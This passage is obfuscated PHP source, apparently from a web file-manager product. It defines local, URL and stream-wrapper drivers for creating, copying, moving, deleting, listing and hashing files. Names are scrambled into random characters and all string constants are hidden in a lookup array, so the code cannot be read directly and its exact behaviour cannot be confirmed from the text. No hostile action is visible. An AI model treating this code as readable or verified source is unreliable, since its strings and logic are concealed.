ceil($ä÷Ç§ò« / pow(1024, 3))) * 3600 * 4; $Ğöí¦ÏŠ = $this->uploadMultiData($ıÉÕüÑ, $ïÎ£Ì³Ò); if ($Ğöí¦ÏŠ) { $Ğöí¦ÏŠ[$è‰£Å[97]] = $ıÉÕüÑ; $Ğöí¦ÏŠ[$è‰£Å[98]] = $¬¶’; } return $Ğöí¦ÏŠ; } public function fileOutImage($«åŸĞš, $‡ôÌ”àî = 250) { if ($this->size($«åŸĞš) > 1024 * 1024 * 25) { return $this->fileOutImageServer($«åŸĞš, $‡ôÌ”àî); } $à¸ÙÉ¾ = $this->link($«åŸĞš); $à¸ÙÉ¾ .= $_SERVER[ÓïÕü][1489] . $‡ôÌ”àî; $this->fileOutLink($à¸ÙÉ¾); } public function fileOutLink($‡ı¹Õ©ƒ) { $®™¶Œ¾È =& $_SERVER[ÓïÕü]; if (substr($‡ı¹Õ©ƒ, 0, 7) == $®™¶Œ¾È[219]) { $‡ı¹Õ©ƒ = $®™¶Œ¾È[220] . substr($‡ı¹Õ©ƒ, 7); } header($®™¶Œ¾È[175] . $‡ı¹Õ©ƒ); die; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($‰éûÓÕÂ) { if (substr($‰éûÓÕÂ, 0, 2) == $_SERVER[ÓïÕü][1446]) { $‰éûÓÕÂ = BASIC_PATH . substr($‰éûÓÕÂ, 2); } return $‰éûÓÕÂ; } public function iconvApp($¾Ş‘òÍ®) { $¼ˆéúõ® =& $_SERVER[ÓïÕü]; global $config; return $this->iconvTo($¾Ş‘òÍ®, $config[$¼ˆéúõ®[1475]], $config[$¼ˆéúõ®[1474]]); } public function iconvSystem($„Ëûõ°¾) { $ÜÛŞ‚Õ =& $_SERVER[ÓïÕü]; global $config; return $this->iconvTo($„Ëûõ°¾, $config[$ÜÛŞ‚Õ[1474]], $config[$ÜÛŞ‚Õ[1475]]); } public function getPathOuter($âï‰çËˆ) { $¹ıÚ©ºù =& $_SERVER[ÓïÕü]; $Ú³½²Ø€ = $this->iconvApp($this->pathBase); $âï‰çËˆ = $this->iconvApp($âï‰çËˆ); if (substr($Ú³½²Ø€, 0, 2) == $¹ıÚ©ºù[1446]) { $Ú³½²Ø€ = BASIC_PATH . substr($Ú³½²Ø€, 2); } if (substr($âï‰çËˆ, 0, 2) == $¹ıÚ©ºù[1446]) { $âï‰çËˆ = BASIC_PATH . substr($âï‰çËˆ, 2); } $Ú³½²Ø€ = KodIO::clear($Ú³½²Ø€); $âï‰çËˆ = KodIO::clear($âï‰çËˆ); $âï‰çËˆ = substr($âï‰çËˆ, strlen($Ú³½²Ø€)); if (empty($this->pathDriver)) { return $âï‰çËˆ; } return $this->pathDriver . $¹ıÚ©ºù[8] . ltrim($âï‰çËˆ, $¹ıÚ©ºù[8]); } public function mkfile($ßœğÁÖ, $Ä†±è« = '', $¢Òå”ñä = REPEAT_RENAME) { $ßœğÁÖ = $this->iconvSystem($ßœğÁÖ); @touch($ßœğÁÖ); if ($Ä†±è«) { file_put_contents($ßœğÁÖ, $Ä†±è«); } @chmod($ßœğÁÖ, $this->pathAuth); if (is_file($ßœğÁÖ)) { return $this->getPathOuter($ßœğÁÖ); } $this->writeLog(__FUNCTION__ . $_SERVER[ÓïÕü][1486], !0); return !1; } public function mkdir($ö”‘ÕûÉ, $µİî‚·ô = REPEAT_SKIP) { $ö”‘ÕûÉ = $this->iconvSystem($ö”‘ÕûÉ); if (is_dir($ö”‘ÕûÉ)) { return $this->getPathOuter($ö”‘ÕûÉ); } @mkdir($ö”‘ÕûÉ, $this->pathAuth, !0); @chmod($ö”‘ÕûÉ, $this->pathAuth); if (is_dir($ö”‘ÕûÉ)) { return $this->getPathOuter($ö”‘ÕûÉ); } $this->writeLog(__FUNCTION__ . $_SERVER[ÓïÕü][1486], !0); return !1; } public function copyFile($¡‡…öŞ, $û«¶Ö£‰) { $this->mkdir($this->pathFather($û«¶Ö£‰)); $¡‡…öŞ = $this->iconvSystem($¡‡…öŞ); $û«¶Ö£‰ = $this->iconvSystem($û«¶Ö£‰); $–ºûùä© = copy_64($¡‡…öŞ, $û«¶Ö£‰); @chmod($û«¶Ö£‰, $this->pathAuth); if ($–ºûùä©) { return $this->getPathOuter($û«¶Ö£‰); } $this->writeLog(__FUNCTION__ . $_SERVER[ÓïÕü][1486], !0); return !1; } public function moveFile($Ú·äÒĞÁ, $—¬¥¥³Ğ) { $this->mkdir($this->pathFather($—¬¥¥³Ğ)); $Ú·äÒĞÁ = $this->iconvSystem($Ú·äÒĞÁ); $—¬¥¥³Ğ = $this->iconvSystem($—¬¥¥³Ğ); $¸ÏÏúì² = intval(@rename($Ú·äÒĞÁ, $—¬¥¥³Ğ)); if (!$¸ÏÏúì²) { if ($¸ÏÏúì² = intval(@copy_64($Ú·äÒĞÁ, $—¬¥¥³Ğ))) { @unlink($Ú·äÒĞÁ); } } @chmod($—¬¥¥³Ğ, $this->pathAuth); if ($¸ÏÏúì²) { return $this->getPathOuter($—¬¥¥³Ğ); } $this->writeLog(__FUNCTION__ . $_SERVER[ÓïÕü][1486], !0); return !1; } public function movePath($÷œÏƒÉœ, $ÃŠ¿•âº, $ô«Ÿ±Áİ = false) { $ç¤ÔŒ³š =& $_SERVER[ÓïÕü]; $÷œÏƒÉœ = $this->iconvSystem($÷œÏƒÉœ); $ÃŠ¿•âº = $this->iconvSystem($ÃŠ¿•âº); $©ş»Ï¤² = rtrim($ÃŠ¿•âº, $ç¤ÔŒ³š[8]) . $ç¤ÔŒ³š[8] . ($ô«Ÿ±Áİ ? $ô«Ÿ±Áİ : get_path_this($÷œÏƒÉœ)); if (file_exists($©ş»Ï¤²)) { return !1; } $ˆºœïß´ = intval(@rename($÷œÏƒÉœ, $©ş»Ï¤²)); $ˆºœïß´ = file_exists($©ş»Ï¤²); if ($ˆºœïß´) { return $this->getPathOuter($©ş»Ï¤²); } $this->writeLog(__FUNCTION__ . $ç¤ÔŒ³š[1486], !0); return !1; } public function delFile($Êñ•“ü›) { $Êñ•“ü› = $this->iconvSystem($Êñ•“ü›); if (!@unlink($Êñ•“ü›)) { @chmod($Êñ•“ü›, $this->pathAuth); if (@unlink($Êñ•“ü›)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[ÓïÕü][1486], !0); return !1; } return !0; } public function delFolder($­¶Û¶²¥) { $ ÇßŞş± =& $_SERVER[ÓïÕü]; $­¶Û¶²¥ = $this->iconvSystem($­¶Û¶²¥); if (!is_dir($­¶Û¶²¥)) { return !0; } if (!($Ûá…‚ = opendir($­¶Û¶²¥))) { return !1; } while (($¨œ¼¤æó = readdir($Ûá…‚)) !== !1) { if ($¨œ¼¤æó == $ ÇßŞş±[10] || $¨œ¼¤æó == $ ÇßŞş±[1391]) { continue; } $à¥†š²Œ = $­¶Û¶²¥ . $ ÇßŞş±[8] . $¨œ¼¤æó; if (is_file($à¥†š²Œ) || is_link($à¥†š²Œ)) { if (!unlink($à¥†š²Œ)) { chmod($à¥†š²Œ, $this->pathAuth); if (!unlink($à¥†š²Œ)) { return !1; } } } else { if (is_dir($à¥†š²Œ)) { chmod($à¥†š²Œ, $this->pathAuth); $à¥†š²Œ = $this->iconvApp($à¥†š²Œ); if (!$this->delFolder($à¥†š²Œ)) { return !1; } } } } closedir($Ûá…‚); return rmdir($­¶Û¶²¥); } public function rename($‚¤ûãüğ, $Ô´µĞ™‹) { $åÓíŠ¢¢ =& $_SERVER[ÓïÕü]; $¨ƒÁœšæ = $this->fileNameAuto($this->pathFather($‚¤ûãüğ), $Ô´µĞ™‹); $¨ƒÁœšæ = $this->iconvSystem($¨ƒÁœšæ); $‚¤ûãüğ = $this->iconvSystem($‚¤ûãüğ); $êìŞâ‰® = $this->pathFather($‚¤ûãüğ); $Üñ²°£Ì = rtrim($êìŞâ‰®, $åÓíŠ¢¢[8]) . $åÓíŠ¢¢[8] . $¨ƒÁœšæ; $Ğ¥ˆÀôÕ = @rename($‚¤ûãüğ, $Üñ²°£Ì); $Üñ²°£Ì = $this->iconvApp($Üñ²°£Ì); if ($Ğ¥ˆÀôÕ) { return $this->getPathOuter($Üñ²°£Ì); } $this->writeLog(__FUNCTION__ . $åÓíŠ¢¢[1486], !0); return !1; } public function size($Õ²à‹ÎÖ) { $Õ²à‹ÎÖ = $this->iconvSystem($Õ²à‹ÎÖ); return filesize_64($Õ²à‹ÎÖ); } public function info($ö¾äë–Ò) { $ö¾äë–Ò = $this->iconvSystem($ö¾äë–Ò); if ($this->isFolder($ö¾äë–Ò)) { return $this->folderInfo($ö¾äë–Ò); } else { if ($this->isFile($ö¾äë–Ò)) { return $this->fileInfo($ö¾äë–Ò); } } return !1; } protected function infoChildren($ù“ò¯Âç, &$Õ°Ü²’, $øâù×Î‚ = true) { $ÍŒšÃ“Ó =& $_SERVER[ÓïÕü]; check_abort_echo(); $ù“ò¯Âç = rtrim($ù“ò¯Âç, $ÍŒšÃ“Ó[8]) . $ÍŒšÃ“Ó[8]; if ($øâù×Î‚) { $ù“ò¯Âç = $this->iconvSystem($ù“ò¯Âç); } if (!($šÌ³öù÷ = @opendir($ù“ò¯Âç))) { return; } while (($“ÙİÎ = readdir($šÌ³öù÷)) !== !1) { if ($“ÙİÎ == $ÍŒšÃ“Ó[10] || $“ÙİÎ == $ÍŒšÃ“Ó[1391]) { continue; } $×‚‚§ì = $ù“ò¯Âç . $“ÙİÎ; if (is_file($×‚‚§ì) || is_link($×‚‚§ì)) { $Õ°Ü²’[$ÍŒšÃ“Ó[80]]++; $Õ°Ü²’[$ÍŒšÃ“Ó[79]] += filesize_64($×‚‚§ì); } else { if (is_dir($×‚‚§ì)) { $Õ°Ü²’[$ÍŒšÃ“Ó[81]]++; $this->infoChildren($×‚‚§ì, $Õ°Ü²’, !1); } } } closedir($šÌ³öù÷); } private function folderInfo($¾¥òŠ¿Ó, $¼ü‡ÎŸ¥ = false) { $ì§ìØÛÍ =& $_SERVER[ÓïÕü]; $¾¥òŠ¿Ó = rtrim($¾¥òŠ¿Ó, $ì§ìØÛÍ[8]) . $ì§ìØÛÍ[8]; $ÁİŠŸÈ¨ = $this->iconvApp($this->pathThis($¾¥òŠ¿Ó)); if ($¼ü‡ÎŸ¥) { return array($ì§ìØÛÍ[32] => $ÁİŠŸÈ¨, $ì§ìØÛÍ[87] => $this->getPathOuter($¾¥òŠ¿Ó), $ì§ìØÛÍ[33] => $ì§ìØÛÍ[78]); } $ÇÁá—ü· = array($ì§ìØÛÍ[32] => $ÁİŠŸÈ¨, $ì§ìØÛÍ[87] => $this->getPathOuter($¾¥òŠ¿Ó), $ì§ìØÛÍ[33] => $ì§ìØÛÍ[78], $ì§ìØÛÍ[234] => @filectime($¾¥òŠ¿Ó), $ì§ìØÛÍ[88] => @filemtime($¾¥òŠ¿Ó), $ì§ìØÛÍ[1490] => @fileatime($¾¥òŠ¿Ó), $ì§ìØÛÍ[1491] => is_readable($¾¥òŠ¿Ó), $ì§ìØÛÍ[1492] => is_writable($¾¥òŠ¿Ó), $ì§ìØÛÍ[1493] => get_mode($¾¥òŠ¿Ó)); return $ÇÁá—ü·; } private function fileInfo($çáÁñ€ƒ, $ÉÃ‘æ¦Ÿ = false) { $§¼Àì®¦ =& $_SERVER[ÓïÕü]; $øÙ‰ñòº = $this->iconvApp($this->pathThis($çáÁñ€ƒ)); if ($ÉÃ‘æ¦Ÿ) { return array($§¼Àì®¦[32] => $øÙ‰ñòº, $§¼Àì®¦[87] => $this->getPathOuter($çáÁñ€ƒ), $§¼Àì®¦[33] => $§¼Àì®¦[233], $§¼Àì®¦[79] => $this->size($çáÁñ€ƒ), $§¼Àì®¦[169] => $this->ext($øÙ‰ñòº)); } $—ùÈÏœå = array($§¼Àì®¦[32] => $øÙ‰ñòº, $§¼Àì®¦[87] => $this->getPathOuter($çáÁñ€ƒ), $§¼Àì®¦[33] => $§¼Àì®¦[233], $§¼Àì®¦[234] => @filectime($çáÁñ€ƒ), $§¼Àì®¦[88] => @filemtime($çáÁñ€ƒ), $§¼Àì®¦[1490] => @fileatime($çáÁñ€ƒ), $§¼Àì®¦[79] => $this->size($çáÁñ€ƒ), $§¼Àì®¦[169] => $this->ext($øÙ‰ñòº), $§¼Àì®¦[1491] => is_readable($çáÁñ€ƒ), $§¼Àì®¦[1492] => is_writable($çáÁñ€ƒ), $§¼Àì®¦[1493] => get_mode($çáÁñ€ƒ)); return $—ùÈÏœå; } public function exist($õ×…üäÈ) { $õ×…üäÈ = $this->iconvSystem($õ×…üäÈ); return @file_exists($õ×…üäÈ); } public function isFile($÷òœ‘âõ) { $÷òœ‘âõ = $this->iconvSystem($÷òœ‘âõ); return @is_file($÷òœ‘âõ); } public function isFolder($»´¾¶£) { $»´¾¶£ = $this->iconvSystem($»´¾¶£); return @is_dir($»´¾¶£); } public function listPath($¢£Ãµó“, $æ°Û®˜í = false) { $·ºğ¤û­ =& $_SERVER[ÓïÕü]; $¢£Ãµó“ = $this->iconvSystem($¢£Ãµó“); $¢£Ãµó“ = rtrim($¢£Ãµó“, $·ºğ¤û­[8]) . $·ºğ¤û­[8]; $¢ØÔî®Ò = array($·ºğ¤û­[85] => array(), $·ºğ¤û­[86] => array()); if (!($¾ĞÔë¹ = @opendir($¢£Ãµó“))) { return $¢ØÔî®Ò; } while (($ş‚ìÜÇ  = readdir($¾ĞÔë¹)) !== !1) { if ($ş‚ìÜÇ  == $·ºğ¤û­[10] || $ş‚ìÜÇ  == $·ºğ¤û­[1391]) { continue; } $‹ªÑß† = $¢£Ãµó“ . $ş‚ìÜÇ ; if (is_file($‹ªÑß†)) { $¢ØÔî®Ò[$·ºğ¤û­[86]][] = $this->fileInfo($‹ªÑß†, $æ°Û®˜í); } else { $¢ØÔî®Ò[$·ºğ¤û­[85]][] = $this->folderInfo($‹ªÑß†, $æ°Û®˜í); } } closedir($¾ĞÔë¹); return $¢ØÔî®Ò; } public function listAll($Óİ÷Ü™Ç, &$»©Â¿´î = array()) { $œ®•©ñÈ =& $_SERVER[ÓïÕü]; $Óİ÷Ü™Ç = $this->iconvSystem($Óİ÷Ü™Ç); $Óİ÷Ü™Ç = rtrim($Óİ÷Ü™Ç, $œ®•©ñÈ[8]) . $œ®•©ñÈ[8]; if (!($”û¬¢ê = @opendir($Óİ÷Ü™Ç))) { return $»©Â¿´î; } while (($­¶–”–İ = readdir($”û¬¢ê)) !== !1) { if ($­¶–”–İ == $œ®•©ñÈ[10] || $­¶–”–İ == $œ®•©ñÈ[1391]) { continue; } $ëŠ·ö“ = $Óİ÷Ü™Ç . $­¶–”–İ; $êÇÈÓ× = is_dir($ëŠ·ö“) && !is_link($ëŠ·ö“) ? 1 : 0; $ëŠ·ö“ = $êÇÈÓ× ? $ëŠ·ö“ . $œ®•©ñÈ[8] : $ëŠ·ö“; $»©Â¿´î[] = array($œ®•©ñÈ[87] => $this->getPathOuter($ëŠ·ö“), $œ®•©ñÈ[78] => $êÇÈÓ×, $œ®•©ñÈ[88] => intval(@filemtime($ëŠ·ö“)), $œ®•©ñÈ[79] => $êÇÈÓ× ? 0 : intval($this->size($ëŠ·ö“))); if ($êÇÈÓ×) { $this->listAll($ëŠ·ö“, $»©Â¿´î); } } closedir($”û¬¢ê); return $»©Â¿´î; } public function has($…Ê±ğ, $¹ÔÑ·òİ = false, $õ’Ñ‡ì˜ = true) { $Íñ’« =& $_SERVER[ÓïÕü]; $…Ê±ğ = $this->iconvSystem($…Ê±ğ); $…Ê±ğ = rtrim($…Ê±ğ, $Íñ’«[8]) . $Íñ’«[8]; if (!($­Ê™çÌ = @opendir($…Ê±ğ))) { return !1; } $ñâÑü¼¾ = 0; $ºÚÉê¶Æ = 0; $·µ¢¤ï = 0; while (($µÃ·Äá = readdir($­Ê™çÌ)) !== !1) { if ($µÃ·Äá == $Íñ’«[10] || $µÃ·Äá == $Íñ’«[1391]) { continue; } $ß›Šæ = $…Ê±ğ . $µÃ·Äá; if ($¹ÔÑ·òİ) { $·µ¢¤ï++; if (@is_file($ß›Šæ)) { $ñâÑü¼¾++; } else { $ºÚÉê¶Æ++; } if ($·µ¢¤ï > 10000) { break; } continue; } if ($õ’Ñ‡ì˜) { if (@is_file($ß›Šæ)) { return !0; } } else { if (@is_dir($ß›Šæ . $Íñ’«[8])) { return !0; } } } closedir($­Ê™çÌ); if ($¹ÔÑ·òİ) { return array($Íñ’«[242] => $ñâÑü¼¾, $Íñ’«[243] => $ºÚÉê¶Æ); } return !1; } public function hashSimple($å„îš‹Ë) { $·ÑåĞ‘¼ =& $_SERVER[ÓïÕü]; if (!$å„îš‹Ë) { return md5($·ÑåĞ‘¼[12]); } $å„îš‹Ë = $this->iconvSystem($å„îš‹Ë); $Ô÷Ï€Æ— = $this->size($å„îš‹Ë); $€Ô¥¨Ñ = 200; $­¾†€ = 50; if ($Ô÷Ï€Æ— <= $€Ô¥¨Ñ * $­¾†€) { return $this->hashMd5($å„îš‹Ë) . $Ô÷Ï€Æ—; } $œæÊÏÛ¦ = $·ÑåĞ‘¼[12]; $ö¢ïî˜¦ = intval($Ô÷Ï€Æ— / $­¾†€); $Š¡«ªÎì = fopen($å„îš‹Ë, $·ÑåĞ‘¼[1494]); if (!$Š¡«ªÎì) { return $œæÊÏÛ¦; } for ($õÂ²Áø™ = 0; $õÂ²Áø™ < $­¾†€; $õÂ²Áø™++) { fseek_64($Š¡«ªÎì, $ö¢ïî˜¦ * $õÂ²Áø™); $œæÊÏÛ¦ .= fread($Š¡«ªÎì, $€Ô¥¨Ñ); } fseek_64($Š¡«ªÎì, $Ô÷Ï€Æ— - $€Ô¥¨Ñ); $œæÊÏÛ¦ .= fread($Š¡«ªÎì, $€Ô¥¨Ñ); fclose($Š¡«ªÎì); return md5($œæÊÏÛ¦) . $Ô÷Ï€Æ—; } public function getContent($åÏƒ¯®•) { $åÏƒ¯®• = $this->iconvSystem($åÏƒ¯®•); return file_get_contents($åÏƒ¯®•); } public function setContent($¨µÏò“—, $‹×ª‘¶Ì = '') { $¨µÏò“— = $this->iconvSystem($¨µÏò“—); $€×Ü‘Æ‡ = @file_put_contents($¨µÏò“—, $‹×ª‘¶Ì, LOCK_EX); if (!$€×Ü‘Æ‡) { $this->writeLog(__FUNCTION__ . $_SERVER[ÓïÕü][1486], !0); } clearstatcache(); @chmod($¨µÏò“—, $this->pathAuth); return $€×Ü‘Æ‡ === !1 ? !1 : !0; } public function fileSubstr($Öìôá©¤, $óªÆ×ÆÇ = 0, $şîÖÎ”¨ = false) { $æ‘Õí®æ =& $_SERVER[ÓïÕü]; $Öìôá©¤ = $this->iconvSystem($Öìôá©¤); if ($şîÖÎ”¨ === !1) { $şîÖÎ”¨ = $this->size($Öìôá©¤); } if ($şîÖÎ”¨ <= 0) { return $æ‘Õí®æ[12]; } $éŠèìÔÃ = fopen($Öìôá©¤, $æ‘Õí®æ[1494]); if (!$éŠèìÔÃ) { return !1; } fseek_64($éŠèìÔÃ, $óªÆ×ÆÇ); $è´Ùä¬Æ = fread($éŠèìÔÃ, $şîÖÎ”¨); fclose($éŠèìÔÃ); if (!$è´Ùä¬Æ) { $this->writeLog(__FUNCTION__ . $æ‘Õí®æ[1486], !0); } return $è´Ùä¬Æ; } public function upload($ÛÌ£ƒÙ´, $¦óÖÇö±, $€æèÙÔ– = false, $Ü¦À‚î© = REPEAT_REPLACE) { if ($€æèÙÔ–) { return $this->moveFile($¦óÖÇö±, $ÛÌ£ƒÙ´); } return $this->copyFile($¦óÖÇö±, $ÛÌ£ƒÙ´); } public function setModifyTime($ÍÒ«À¦, $ßç‚Ç = '') { @touch($ÍÒ«À¦, intval($ßç‚Ç)); } public function download($Òˆ¢µ‡, $¢½ıê»ô) { return $this->iconvSystem($Òˆ¢µ‡); } } goto F¡­Èã±šˆ; d“‹Ê˜‹¹: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($Å±ôô·¾ = false) { } public function exist($¦æ‹ç„³) { $ëù€ªŸÜ = $this->info($¦æ‹ç„³); return $ëù€ªŸÜ[$_SERVER[ÓïÕü][235]]; } public function isFile($òµ˜îå‘) { $ĞÉ–Ÿèü = $this->info($òµ˜îå‘); return $ĞÉ–Ÿèü[$_SERVER[ÓïÕü][235]]; } public function isFolder($·¡¿—êê) { return !1; } public function size($¬É¢«») { $Ÿ»ÑÃ¯à = $this->info($¬É¢«»); return $Ÿ»ÑÃ¯à[$_SERVER[ÓïÕü][79]]; } public function info($Ì°—é¨) { return $this->infoParse($Ì°—é¨); } public function infoAuth($²³ª¦¸ô) { return $this->infoParse($²³ª¦¸ô); } public function infoWithChildren($ñ×‹£øÀ) { return $this->infoParse($ñ×‹£øÀ); } public function infoFull($²åàŸÁ°) { return $this->infoParse($²åàŸÁ°); } private function infoParse($©Õı·õÓ) { $…ˆ„ø•” =& $_SERVER[ÓïÕü]; $‘§â ƒç = $this->header($©Õı·õÓ); if (!$‘§â ƒç || !$‘§â ƒç[$…ˆ„ø•”[841]]) { return !1; } $Ó••È”º = _get($‘§â ƒç, $…ˆ„ø•”[415], 0); $¡†‘÷ßì = array($…ˆ„ø•”[32] => $‘§â ƒç[$…ˆ„ø•”[32]], $…ˆ„ø•”[87] => $©Õı·õÓ, $…ˆ„ø•”[33] => $…ˆ„ø•”[233], $…ˆ„ø•”[79] => intval($Ó••È”º), $…ˆ„ø•”[169] => get_path_ext($‘§â ƒç[$…ˆ„ø•”[32]]), $…ˆ„ø•”[1491] => $Ó••È”º > 0 && $‘§â ƒç[$…ˆ„ø•”[1640]], $…ˆ„ø•”[1492] => !1); return $¡†‘÷ßì; } private function header($óË¼“¹ë) { $Ã“¢İô =& $_SERVER[ÓïÕü]; if (isset(self::$_cacheHeader[$óË¼“¹ë])) { return self::$_cacheHeader[$óË¼“¹ë]; } $€æ¾Ÿ³É = isset($GLOBALS[$Ã“¢İô[1641]]) ? $GLOBALS[$Ã“¢İô[1641]] : !1; $GLOBALS[$Ã“¢İô[1641]] = !0; self::$_cacheHeader[$óË¼“¹ë] = url_header($óË¼“¹ë); $GLOBALS[$Ã“¢İô[1641]] = $€æ¾Ÿ³É; return self::$_cacheHeader[$óË¼“¹ë]; } public function hashSimple($éÕãõš•, $û£¦Ù²› = false) { $õÍß‡ú¼ =& $_SERVER[ÓïÕü]; $¨õİüö¼ = $this->info($éÕãõš•); if (!$¨õİüö¼ || !$¨õİüö¼[$õÍß‡ú¼[235]]) { return !1; } $šƒÈÄæÎ = $¨õİüö¼[$õÍß‡ú¼[79]]; $‘Ğ¹ë“ö = 200; $ĞÅÚîÓ„ = 50; if ($šƒÈÄæÎ <= $‘Ğ¹ë“ö * $ĞÅÚîÓ„) { return md5($this->fileSubstr($éÕãõš•, 0, $šƒÈÄæÎ)) . $šƒÈÄæÎ; } $‘šÀÑŞÜ = intval($šƒÈÄæÎ / $ĞÅÚîÓ„); $—Óœ°Â– = $õÍß‡ú¼[12]; $ª¯í«€ã = timeFloat(); $»ÆˆÄ– = 15; for ($‚æşµìœ = 0; $‚æşµìœ < $ĞÅÚîÓ„; $‚æşµìœ++) { if (timeFloat() - $ª¯í«€ã > $»ÆˆÄ–) { return !1; } $Ç´§ˆ‡¨ = $this->fileSubstr($éÕãõš•, $‘šÀÑŞÜ * $‚æşµìœ, $‘Ğ¹ë“ö); if (!$Ç´§ˆ‡¨) { return !1; } $—Óœ°Â– .= $Ç´§ˆ‡¨; } $—Óœ°Â– .= $this->fileSubstr($éÕãõš•, $šƒÈÄæÎ - $‘Ğ¹ë“ö, $‘Ğ¹ë“ö); return md5($—Óœ°Â–) . $šƒÈÄæÎ; } public function getContent($«Ğ•”éù) { return $this->fileSubstr($«Ğ•”éù); } public function fileSubstr($Î™ù¨ØÑ, $ÊÍåçîÓ = 0, $’ …İ³ = -1) { $ÃáĞ¦Æñ =& $_SERVER[ÓïÕü]; $Ï‹üÅğŒ = $this->info($Î™ù¨ØÑ); if (!$Ï‹üÅğŒ || !$Ï‹üÅğŒ[$ÃáĞ¦Æñ[235]] && $Ï‹üÅğŒ[$ÃáĞ¦Æñ[79]] > 1024 * 1024 * 10) { return !1; } if ($’ …İ³ === -1) { $’ …İ³ = $Ï‹üÅğŒ[$ÃáĞ¦Æñ[79]]; } if ($’ …İ³ == 0) { return $ÃáĞ¦Æñ[12]; } $Ï¦ëËû« = array($ÃáĞ¦Æñ[1642] . $ÊÍåçîÓ . $ÃáĞ¦Æñ[878] . ($ÊÍåçîÓ + $’ …İ³ - 1)); $Ô´Ó–Ñ• = url_request($Î™ù¨ØÑ, $ÃáĞ¦Æñ[1531], !1, $Ï¦ëËû«, !1, !1, 30); return $Ô´Ó–Ñ•[$ÃáĞ¦Æñ[1315]] ? $Ô´Ó–Ñ•[$ÃáĞ¦Æñ[1315]] : $ÃáĞ¦Æñ[12]; } public function download($´¬†öß‚, $ÀòÃ‚Ø·) { Downloader::start($´¬†öß‚, $ÀòÃ‚Ø·); return $ÀòÃ‚Ø·; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($ç‡û‘, $¹ÄëËÜ = '') { $this->info = $this->info($ç‡û‘); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[ÓïÕü][87]]; $this->pathOpen = $ç‡û‘; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$ç‡û‘])) { self::$_chunkBuffer[$ç‡û‘] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($Ñ¾“îüŸ) { $’ş‡µ¸Í = $this->fileSubstr($this->pose, $Ñ¾“îüŸ); $this->pose += strlen($’ş‡µ¸Í); return $’ş‡µ¸Í; } public function stream_tell() { return $this->pose; } public function stream_seek($ñğ›á‘, $¨¨ ¦ˆ) { $¥©”Íß =& $_SERVER[ÓïÕü]; if ($¨¨ ¦ˆ == SEEK_SET) { $this->pose = $ñğ›á‘; } else { if ($¨¨ ¦ˆ == SEEK_CUR) { $this->pose += $ñğ›á‘; } else { if ($¨¨ ¦ˆ == SEEK_END) { $this->pose = $this->info[$¥©”Íß[79]] + intval($ñğ›á‘); } } } if ($ñğ›á‘ < 0) { $this->pose = $this->info[$¥©”Íß[79]] + $ñğ›á‘; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[ÓïÕü][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($Èçâ·çº, $ÙÕõ‘Î) { $–â•èã =& $_SERVER[ÓïÕü]; $èû¨¥ªñ = $this->info($Èçâ·çº); return array($–â•èã[1435] => 0, $–â•èã[1643] => 0, $–â•èã[16] => 32768 + 511, $–â•èã[1644] => 0, $–â•èã[1645] => 0, $–â•èã[1646] => 0, $–â•èã[1647] => 0, $–â•èã[79] => $èû¨¥ªñ[$–â•èã[79]], $–â•èã[1648] => $èû¨¥ªñ[$–â•èã[1490]], $–â•èã[1605] => $èû¨¥ªñ[$–â•èã[88]], $–â•èã[1604] => $èû¨¥ªñ[$–â•èã[234]], $–â•èã[1649] => 0, $–â•èã[1650] => 0); } static $fileInfo = array(); public function info($Ì±şüÏÊ) { $ë–ğÈÂ = $_SERVER[ÓïÕü][1651]; if (isset(self::$fileInfo[$Ì±şüÏÊ])) { return self::$fileInfo[$Ì±şüÏÊ]; } if (substr($Ì±şüÏÊ, 0, strlen($ë–ğÈÂ)) != $ë–ğÈÂ) { return !1; } self::$fileInfo[$Ì±şüÏÊ] = IO::info(substr($Ì±şüÏÊ, strlen($ë–ğÈÂ))); return self::$fileInfo[$Ì±şüÏÊ]; } public static function read($€ïÑã¸§, $…ß‹°“», $¬Ó”¥İó) { if (!isset(self::$_fopenCache[$€ïÑã¸§])) { $øé³Ø¶Ò = new StreamWrapperIO(); $øé³Ø¶Ò->stream_open($€ïÑã¸§); self::$_fopenCache[$€ïÑã¸§] = $øé³Ø¶Ò; } $øé³Ø¶Ò = self::$_fopenCache[$€ïÑã¸§]; return $øé³Ø¶Ò->fileSubstr($…ß‹°“», $¬Ó”¥İó); } public static function _read($ÁûğÉ£, $ÜçÆØÂ, $ÖÑæ†â±) { $÷Ğ»Ë»Š =& $_SERVER[ÓïÕü]; $ÉıùÁ° = fopen($ÁûğÉ£, $÷Ğ»Ë»Š[1494]); if (!$ÉıùÁ°) { return $÷Ğ»Ë»Š[12]; } $¿ÔŸ©²– = 8192; fseek($ÉıùÁ°, $ÜçÆØÂ, SEEK_SET); $½¼¢“× = $÷Ğ»Ë»Š[12]; $ïĞÄí¡ = 0; while ($ïĞÄí¡ < $ÖÑæ†â±) { $—€Îæ¢Ó = min($¿ÔŸ©²–, $ÖÑæ†â± - $ïĞÄí¡); $½¼¢“× .= fread($ÉıùÁ°, $—€Îæ¢Ó); $ïĞÄí¡ += $—€Îæ¢Ó; } fclose($ÉıùÁ°); return $½¼¢“×; } public function fileSubstr($Ôüæ§ÌŸ, $‘ˆìòÏí) { $ó±Éİˆ =& $_SERVER[ÓïÕü]; $‹§ñŸÍÑ = $this->info[$ó±Éİˆ[79]]; $¹ÒÒö‚ˆ = $Ôüæ§ÌŸ; $ˆ•–ØŠö = $‘ˆìòÏí; if ($Ôüæ§ÌŸ < 0) { $Ôüæ§ÌŸ = $‹§ñŸÍÑ + $Ôüæ§ÌŸ; } if ($‘ˆìòÏí === !1) { $‘ˆìòÏí = $‹§ñŸÍÑ - $Ôüæ§ÌŸ; } if ($Ôüæ§ÌŸ + $‘ˆìòÏí > $‹§ñŸÍÑ) { $‘ˆìòÏí = $‹§ñŸÍÑ - 